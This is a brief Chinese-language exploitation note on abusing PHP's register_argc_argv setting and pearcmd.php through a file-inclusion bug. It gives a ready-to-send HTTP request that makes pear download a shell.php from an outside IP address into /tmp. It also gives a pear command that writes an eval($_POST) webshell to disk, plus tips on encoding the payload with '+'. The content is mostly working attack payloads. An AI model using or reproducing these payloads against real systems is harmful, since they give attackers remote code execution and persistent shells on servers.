# 参考
	- https://blog.csdn.net/rfrder/article/details/121042290
- `register_argc_argv`
	- 读取HTTP Query为`$_SERVER['argv']`
	- 如果存在php.ini的话，默认是Off。如果没有php.ini则默认是On。
	- 以`+`作为分隔
- 使用
	- [[PHP/PEAR]]
- # 利用
	- 如果有`include $_GET['file']`
		- ```
		  GET /?file=/usr/local/lib/php/pearcmd.php&+install+-R+/tmp+http://121.5.169.223:39777/shell.php HTTP/1.1
		  Host: 119.45.254.56:23343
		  Upgrade-Insecure-Requests: 1
		  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
		  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
		  Accept-Encoding: gzip, deflate
		  Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
		  Connection: close
		  
		  
		  ```
	- 也可以写入文件
		- ```
		  pear -c /tmp/.feng.php -d man_dir=<?=eval($_POST[0]);?> -s
		  ```
	- 注意利用时不能使用`%20`，需要使用`+`